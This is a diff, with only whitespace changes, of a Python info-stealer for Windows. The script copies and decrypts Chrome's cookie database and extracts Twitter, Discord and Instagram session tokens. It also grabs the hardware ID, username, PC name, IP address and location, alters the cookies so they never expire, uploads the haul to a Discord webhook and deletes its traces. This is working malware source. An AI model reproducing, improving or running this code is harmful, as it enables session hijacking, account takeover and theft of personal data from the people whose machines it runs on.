@@ -29,8 +29,6 @@ webhook = ""
 #website selection (do not change for the good functioning of the system)
 website = ['twitter.com', 'discord.com', 'instagram.com']
 
-
-
 #hwid grabber (serial number)
 def get_hwid():
     p = Popen('wmic csproduct get uuid', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
@@ -94,15 +92,12 @@ def decrypt_data(data, key):
             return str(CryptUnprotectData(data, None, None, None, 0)[1])
         except:
             return ""
-
-
-
+        
 #main code 
 def main():
     filename = "Cookies.db"
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                             "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
-
     if not os.path.isfile(filename):
         copyfile(db_path, filename)
         SetFileAttributes(filename,win32con.FILE_ATTRIBUTE_HIDDEN)
@@ -164,7 +159,6 @@ def main():
                 elif x == 'instagram.com':
                     if name == 'sessionid' or name =='ds_user_id':
                         logon_instagram += f"""Host: {host_key}\nCookie name: {name}\nCookie value [instagram authentification key]: {decrypted_value}\n=====================================================\n"""
-
     hwid = get_hwid()
     pc_username = os.getenv('UserName')
     pc_name = os.getenv('COMPUTERNAME')
@@ -173,12 +167,10 @@ def main():
         ip_address=urlopen(Request('https://api64.ipify.org')).read().decode().strip()
         country=urlopen(Request(f'https://ipapi.co/{ip_address}/country_name')).read().decode().strip()
         city=urlopen(Request(f'https://ipapi.co/{ip_address}/city')).read().decode().strip()
-        
     except:
         city="City not found -_-"
         country="Country not found -_-"
         ip_address="No IP found -_-"
-    
     Personnal_info = f"**PC name:** `{pc_name}`\n**Pc username:** `{pc_username}`\n**Ip Adress:** `{ip_address}`\n**Country:** `{country}`\n**City:** `{city}`\n**HWID:** `{hwid}`"
     #cookies expirations changer (makes sure cookies never expire)
     cursor.execute("""
@@ -239,7 +231,6 @@ def main():
     with open("Cooked_data.txt", "rb") as f:
         webhook.add_file(file=f.read(), filename='data.txt')
     webhook.execute()
- 
     db.commit()
     db.close()
     try:
@@ -247,6 +238,5 @@ def main():
         os.remove('Cooked_data.txt')
     except:
         pass
-
 if __name__ == "__main__":
     main()
